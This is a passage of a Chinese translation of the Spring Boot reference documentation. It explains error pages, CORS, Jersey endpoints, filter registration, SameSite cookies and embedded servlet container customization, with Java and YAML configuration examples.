        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token operator">::</span><span class="token function">registerErrorPages</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">registerErrorPages</span><span class="token punctuation">(</span><span class="token class-name">ErrorPageRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        registry<span class="token punctuation">.</span><span class="token function">addErrorPages</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ErrorPage</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">BAD_REQUEST</span><span class="token punctuation">,</span> <span class="token string">"/400"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>如果使用最终由过滤器处理的路径注册<code>ErrorPage</code>（这在Jersey和Wicket等一些非Spring Web框架中很常见），那么过滤器就必须显式注册为<code>ERROR</code>dispatcher，如下例所示：</p> 
</blockquote> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">EnumSet</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">DispatcherType</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterRegistrationBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyFilterConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MyFilter</span><span class="token punctuation">&gt;</span></span> <span class="token function">myFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MyFilter</span><span class="token punctuation">&gt;</span></span> registration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// ...</span>
        registration<span class="token punctuation">.</span><span class="token function">setDispatcherTypes</span><span class="token punctuation">(</span><span class="token class-name">EnumSet</span><span class="token punctuation">.</span><span class="token function">allOf</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> registration<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>请注意，默认的 <code>FilterRegistrationBean</code> 不包含 <code>ERROR</code> dispatcher 类型。</p> 
<h6><a id="WAR__432"></a>WAR 部署中的错误处理</h6> 
<p>部署到 servlet 容器时，Spring Boot 会使用错误页面过滤器将错误状态的请求转发到相应的错误页面。这是必要的，因为 servlet 规范没有提供注册错误页面的 API。根据您部署 war 文件的容器和应用程序使用的技术，可能需要进行一些额外的配置。<br> 只有当响应尚未提交时，错误页面过滤器才能将请求转发到正确的错误页面。默认情况下，WebSphere Application Server 8.0 及更高版本会在 servlet 的服务方法成功完成后提交响应。您应将 <code>com.ibm.ws.webcontainer.invokeFlushAfterService</code> 设置为 <code>false</code>，从而禁用此行为。</p> 
<h5><a id="CORS__435"></a>CORS 支持</h5> 
<p><a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing" rel="nofollow">跨源资源共享</a>（CORS）是<a href="https://www.w3.org/TR/cors/" rel="nofollow">万维网联盟</a>（W3C）的一项规范，由<a href="https://caniuse.com/#feat=cors" rel="nofollow">大多数浏览器</a>实施，可让您以灵活的方式指定授权的跨域请求类型，而不是使用 IFRAME 或 JSONP 等安全性较低、功能较弱的方法。<br> 从 4.2 版开始，Spring MVC <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc-cors.html" rel="nofollow">支持 CORS</a>。在 Spring Boot 应用程序中使用带有 <code>@CrossOrigin</code> 注解的控制器方法 CORS 配置不需要任何特定配置。<a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc-cors.html#mvc-cors-global" rel="nofollow">全局 CORS 配置</a>可通过使用自定义 <code>addCorsMappings(CorsRegistry)</code> 方法注册 <code>WebMvcConfigurer</code> Bean 来定义，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">CorsRegistry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebMvcConfigurer</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyCorsConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token function">corsConfigurer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">WebMvcConfigurer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addCorsMappings</span><span class="token punctuation">(</span><span class="token class-name">CorsRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                registry<span class="token punctuation">.</span><span class="token function">addMapping</span><span class="token punctuation">(</span><span class="token string">"/api/**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h4><a id="JAXRS__Jersey_461"></a>JAX-RS 和 Jersey</h4> 
<p>如果你更喜欢 REST 端点的 JAX-RS 编程模型，你可以使用其中一种可用的实现来代替 Spring MVC。<a href="https://jersey.github.io/" rel="nofollow">Jersey</a> 和 <a href="https://cxf.apache.org/" rel="nofollow">Apache CXF</a> 开箱即可使用。CXF 要求你在应用上下文中将其 <code>Servlet</code> 或<code>Filter</code>注册为 <code>@Bean</code>。Jersey 有一些原生的 Spring 支持，因此我们还在 Spring Boot 中提供了对它的自动配置支持，同时还提供了一个启动器。<br> 要开始使用 Jersey，请将 <code>spring-boot-starter-jersey</code> 作为依赖项，然后你需要一个 <code>ResourceConfig</code> 类型的 <code>@Bean</code> 来注册所有端点，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>glassfish<span class="token punctuation">.</span>jersey<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ResourceConfig</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyJerseyConfig</span> <span class="token keyword">extends</span> <span class="token class-name">ResourceConfig</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token class-name">MyJerseyConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">MyEndpoint</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>Jersey 对扫描可执行文件的支持非常有限。例如，当运行可执行 war 文件时，Jersey 无法扫描完全<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/deployment.html#deployment.installing" rel="nofollow">可执行 jar 文件</a>或 <code>WEB-INF/classes</code> 中的包中的端点。为避免这一限制，不应使用 <code>packages</code> 方法，而应使用 <code>register</code> 方法单独注册端点，如上例所示。</p> 
</blockquote> 
<p>对于更高级的定制，您还可以注册任意数量的实现 <code>ResourceConfigCustomizer</code> 的 Bean。<br> 所有注册的端点都应是带有 HTTP 资源注解（<code>@GET</code> 及其他）的 <code>@Component</code>，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>ws<span class="token punctuation">.</span>rs<span class="token punctuation">.</span></span><span class="token class-name">GET</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>ws<span class="token punctuation">.</span>rs<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token annotation punctuation">@Path</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyEndpoint</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@GET</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>由于端点是一个 Spring <code>@Component</code>，因此其生命周期由 Spring 管理，你可以使用 <code>@Autowired</code> 注解注入依赖关系，并使用 <code>@Value</code> 注解注入外部配置。默认情况下，Jersey servlet 会注册并映射到 <code>/*</code>。您可以在 <code>ResourceConfig</code> 中添加 <code>@ApplicationPath</code> 来更改映射。<br> 默认情况下，Jersey 在名为 <code>jerseyServletRegistration</code> 的 <code>@Bean</code> 类型 <code>ServletRegistrationBean</code> 中设置为 servlet。默认情况下，Servlet 会被懒惰地初始化，但你可以通过设置 <code>Spring.jersey.servlet.load-on-startup</code> 来自定义该行为。你可以创建一个自己的同名 Bean，从而禁用或覆盖该 Bean。通过设置 <code>spring.jersey.type=filter</code>，还可以使用过滤器代替 servlet（在这种情况下，要替换或覆盖的 <code>@Bean</code> 是 <code>jerseyFilterRegistration</code>）。过滤器有一个 <code>@Order</code>，可以用 <code>spring.jersey.filter.order</code> 设置。将 Jersey 用作过滤器时，必须有一个 servlet 来处理任何未被 Jersey 拦截的请求。如果你的应用程序不包含这样的 servlet，你可能需要通过将 <code>server.servlet.register-default-servlet</code> 设置为 <code>true</code> 来启用默认 servlet。通过使用 <code>spring.jersey.init.*</code> 指定属性映射，可以为 servlet 和过滤器注册提供初始参数。</p> 
<h4><a id="_Servlet__501"></a>嵌入式 Servlet 容器支持</h4> 
<p>对于 servlet 应用程序，Spring Boot 包括对嵌入式 <a href="https://tomcat.apache.org/" rel="nofollow">Tomcat</a>、<a href="https://www.eclipse.org/jetty/" rel="nofollow">Jetty</a> 和 <a href="https://github.com/undertow-io/undertow">Undertow</a> 服务器的支持。大多数开发人员都会使用相应的 "Starter "来获取一个完全配置好的实例。默认情况下，嵌入式服务器通过 <code>8080</code> 端口侦听 HTTP 请求。</p> 
<h5><a id="Servlets_Filters__Listeners_503"></a>Servlets, Filters, 和 Listeners</h5> 
<p>使用嵌入式 servlet 容器时，可以通过 Spring Bean 或扫描 servlet 组件，从 servlet 规范中注册 Servlet、Filters和所有Listener（如 <code>HttpSessionListener</code>）。</p> 
<h6><a id="_ServletFiltersListeners_Spring_Bean_505"></a>将 Servlet、Filters和Listeners注册为 Spring Bean</h6> 
<p>任何作为 Spring Bean 的 <code>Servlet</code>、<code>Filter</code>或<code> Servlet *Listener</code> 实例都会在嵌入式容器中注册。如果您想在配置过程中引用 <code>application.properties</code> 中的值，这将特别方便。<br> 默认情况下，如果上下文只包含一个 Servlet，则映射到 <code>/</code>。过滤器映射到 <code>/*</code>。<br> 如果基于约定的映射不够灵活，可以使用 <code>ServletRegistrationBean</code>、<code>FilterRegistrationBean</code> 和 <code>ServletListenerRegistrationBean</code> 类来实现完全控制。<br> 通常情况下，不对过滤器Bean进行排序是安全的。如果需要特定的顺序，则应使用 <code>@Order</code> 对过滤器进行注解，或使其实现 <code>Ordered</code>。您不能通过用 <code>@Order</code> 注释过滤器的 bean 方法来配置过滤器的顺序。如果无法更改过滤器类以添加 <code>@Order</code> 或实现 <code>Ordered</code>，则必须为过滤器定义一个<code>FilterRegistrationBean</code> ，并使用 <code>setOrder(int)</code> 方法设置注册 Bean 的顺序。请避免配置以 <code>Ordered.HIGHEST_PRECEDENCE</code> 读取请求正文的过滤器，因为它可能与应用程序的字符编码配置相冲突。如果使用 servlet 过滤器封装请求，则应配置小于或等于 <code>OrderedFilter.REQUEST_WRAPPER_FILTER_MAX_ORDER</code> 的顺序。</p> 
<blockquote> 
 <p>要查看应用程序中每个过滤器的顺序，请启用网络<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.logging.log-groups" rel="nofollow">日志组</a>的调试级日志（<code>logging.level.web=debug</code>）。注册过滤器的详细信息（包括顺序和 URL 模式）将在启动时记录。</p> 
</blockquote> 
<blockquote> 
 <p>由于过滤器 Bean 在应用程序生命周期的早期就会被初始化，因此在注册过滤器 Bean 时要小心谨慎。如果您需要注册一个与其他 Bean 交互的过滤器，请考虑使用 <a href="https://docs.spring.io/spring-boot/docs/3.2.0/api/org/springframework/boot/web/servlet/DelegatingFilterProxyRegistrationBean.html" rel="nofollow">DelegatingFilterProxyRegistrationBean</a>。</p> 
</blockquote> 
<h5><a id="_Servlet__514"></a>初始化 Servlet 上下文</h5> 
<p>嵌入式 servlet 容器不会直接执行 <code>jakarta.servlet.ServletContainerInitializer</code> 接口或 Spring 的 <code>org.springframework.web.WebApplicationInitializer</code> 接口。这是一个有意为之的设计决策，旨在降低为在 war 内运行而设计的第三方库破坏 Spring Boot 应用程序的风险。<br> 如果您需要在 Spring Boot 应用程序中执行 Servlet 上下文初始化，您应该注册一个实现 <code>org.springframework.boot.web.servlet.ServletContextInitializer</code> 接口的 Bean。单个 <code>onStartup</code> 方法提供了对 <code>ServletContext</code> 的访问，如有必要，还可轻松用作现有 <code>WebApplicationInitializer</code> 的适配器。</p> 
<h6><a id="Servlets_Filters__listeners_517"></a>扫描Servlets, Filters, 和 listeners</h6> 
<p>使用嵌入式容器时，可通过 <code>@ServletComponentScan</code> 启用注释为 <code>@WebServlet</code>、<code>@WebFilter</code> 和 <code>@WebListener</code> 的类的自动注册。</p> 
<blockquote> 
 <p><code>@ServletComponentScan</code> 在独立容器中不起作用，而是使用容器的内置发现机制。</p> 
</blockquote> 
<h5><a id="ServletWebServerApplicationContext_521"></a>ServletWebServerApplicationContext</h5> 
<p>在引擎盖下，Spring Boot 使用不同类型的 <code>ApplicationContext</code> 来支持嵌入式 servlet 容器。<code>ServletWebServerApplicationContext</code> 是一种特殊类型的 <code>WebApplicationContext</code>，它通过搜索单个 <code>ServletWebServerFactory</code> Bean 进行自我引导。通常会自动配置 <code>TomcatServletWebServerFactory</code>、<code>JettyServletWebServerFactory</code> 或 <code>UndertowServletWebServerFactory</code>。</p> 
<blockquote> 
 <p>您通常不需要了解这些实现类。大多数应用程序都是自动配置的，相应的 <code>ApplicationContext</code> 和 <code>ServletWebServerFactory</code> 会代表你创建。</p> 
</blockquote> 
<p>在嵌入式容器设置中，<code>ServletContext</code> 是在应用程序上下文初始化过程中作为服务器启动的一部分设置的。因此，<code>ApplicationContext</code> 中的 Bean 无法可靠地使用 <code>ServletContext</code> 进行初始化。解决这个问题的方法之一是将 <code>ApplicationContext</code> 作为 bean 的依赖注入，只有在需要时才访问 <code>ServletContext</code>。另一种方法是在服务器启动后使用回调。可以使用 <code>ApplicationListener</code> 监听 <code>ApplicationStartedEvent</code>，具体方法如下：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletContext</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>context<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ApplicationStartedEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ApplicationContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ApplicationListener</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyDemoBean</span> <span class="token keyword">implements</span> <span class="token class-name">ApplicationListener</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ApplicationStartedEvent</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token class-name">ServletContext</span> servletContext<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onApplicationEvent</span><span class="token punctuation">(</span><span class="token class-name">ApplicationStartedEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>servletContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> applicationContext<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="_Servlet__546"></a>自定义嵌入式 Servlet 容器</h5> 
<p>常用的 servlet 容器设置可通过 Spring <code>Environment</code> 属性进行配置。通常，你会在 <code>application.properties</code> 或 <code>application.yaml</code> 文件中定义这些属性。<br> 常见的服务器设置包括：</p> 
<ul><li>网络设置： 接收 HTTP 请求的监听端口（<code>server.port</code>）、绑定的接口地址（<code>server.address</code>）等。</li><li>会话设置： 会话是否持久（<code>server.servlet.session.persistent</code>）、会话超时（<code>server.servlet.session.timeout</code>）、会话数据位置（<code>server.servlet.session.store-dir</code>）和会话 cookie 配置（<code>server.servlet.session.cookie.*</code>）。</li><li>错误管理： 错误页面的位置（<code>server.error.path</code>）等。</li><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.webserver.configure-ssl" rel="nofollow">SSL</a></li><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.webserver.enable-response-compression" rel="nofollow">HTTP 压缩</a></li></ul> 
<p>Spring Boot 尽可能公开通用设置，但这并不总是可能的。在这种情况下，专用命名空间会提供特定于服务器的自定义设置（参见 <code>server.tomcat</code> 和 <code>server.undertow</code>）。例如，可以使用嵌入式 servlet 容器的特定功能配置<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.webserver.configure-access-logs" rel="nofollow">访问日志</a>。</p> 
<blockquote> 
 <p>完整列表请参阅<a href="https://github.com/spring-projects/spring-boot/tree/v3.2.0/spring-boot-project/spring-boot-autoconfigure/src/main/java/org/springframework/boot/autoconfigure/web/ServerProperties.java">ServerProperties</a>。</p> 
</blockquote> 
<h6><a id="SameSite_Cookie_559"></a>SameSite Cookie</h6> 
<p>网络浏览器可使用 <code>SameSite</code> cookie 属性来控制是否以及如何在跨站请求中提交 cookie。该属性对现代网络浏览器尤为重要，因为它们已开始更改缺失该属性时使用的默认值。<br> 如果要更改会话 cookie 的 <code>SameSite</code> 属性，可以使用 <code>server.servlet.session.cookie.same-site</code> 属性。自动配置的 Tomcat、Jetty 和 Undertow 服务器都支持该属性。它还用于配置基于 Spring Session servlet 的 <code>SessionRepository</code> Bean。<br> 例如，如果希望会话 cookie 的 <code>SameSite</code> 属性为 “<code>None</code>”，可以在 <code>application.properties</code> 或 <code>application.yaml</code> 文件中添加以下内容：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token key atrule">session</span><span class="token punctuation">:</span>
      <span class="token key atrule">cookie</span><span class="token punctuation">:</span>
        <span class="token key atrule">same-site</span><span class="token punctuation">:</span> <span class="token string">"none"</span>
</code></pre> 
<p>如果想更改添加到 <code>HttpServletResponse</code> 的其他 Cookie 上的 <code>SameSite</code> 属性，可以使用 <code>CookieSameSiteSupplier</code>。<code>CookieSameSiteSupplier</code> 传递一个 Cookie，并可能返回 <code>SameSite</code> 值或<code>null</code>值。<br> 您可以使用许多方便的工厂和过滤器方法来快速匹配特定的 Cookie。例如，添加以下 bean 将自动为所有名称与正则表达式 <code>myapp.*</code> 匹配的 cookie 应用 <code>Lax</code> 的 <code>SameSite</code>。</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">CookieSameSiteSupplier</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySameSiteConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">CookieSameSiteSupplier</span> <span class="token function">applicationCookieSameSiteSupplier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">CookieSameSiteSupplier</span><span class="token punctuation">.</span><span class="token function">ofLax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">whenHasNameMatching</span><span class="token punctuation">(</span><span class="token string">"myapp.*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="_587"></a>字符编码</h6> 
<p>可使用 <code>server.servlet.encoding.*</code> 配置属性配置嵌入式 servlet 容器处理请求和响应的字符编码行为。<br> 当请求的 <code>Accept-Language</code> 标头指明了请求的地域时，servlet 容器会自动将其映射为字符集。每个容器都会提供默认的本地语言与字符集映射，您应该确认它们是否满足您的应用程序的需要。如果不符合要求，请使用 <code>server.servlet.encoding.mapping</code> 配置属性自定义映射，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token key atrule">encoding</span><span class="token punctuation">:</span>
      <span class="token key atrule">mapping</span><span class="token punctuation">:</span>
        <span class="token key atrule">ko</span><span class="token punctuation">:</span> <span class="token string">"UTF-8"</span>
</code></pre> 
<p>在上例中，<code>ko</code>（韩语）本地语言已被映射为 UTF-8。这相当于传统 war 部署的 <code>web.xml</code> 文件中的 <code>&lt;locale-encoding-mapping-list&gt;</code> 条目。</p> 
<h6><a id="_598"></a>程序自定义</h6> 
<p>如果需要以编程方式配置嵌入式 servlet 容器，可以注册一个实现 <code>WebServerFactoryCustomizer</code> 接口的 Spring Bean。<code>WebServerFactoryCustomizer</code> 提供了对 <code>ConfigurableServletWebServerFactory</code> 的访问，其中包含大量自定义设置方法。下面的示例展示了如何通过编程设置端口：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">WebServerFactoryCustomizer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ConfigurableServletWebServerFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyWebServerFactoryCustomizer</span> <span class="token keyword">implements</span> <span class="token class-name">WebServerFactoryCustomizer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ConfigurableServletWebServerFactory</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">customize</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableServletWebServerFactory</span> server<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        server<span class="token punctuation">.</span><span class="token function">setPort</span><span class="token punctuation">(</span><span class="token number">9000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>


</code></pre> 
<p><code>TomcatServletWebServerFactory</code>、<code>JettyServletWebServerFactory</code> 和 <code>UndertowServletWebServerFactory</code> 是 <code>ConfigurableServletWebServerFactory</code> 的专用变体，它们分别为 Tomcat、Jetty 和 Undertow 提供了额外的自定义设置方法。下面的示例展示了如何定制 <code>TomcatServletWebServerFactory</code>，以提供对 Tomcat 特定配置选项的访问：</p> 
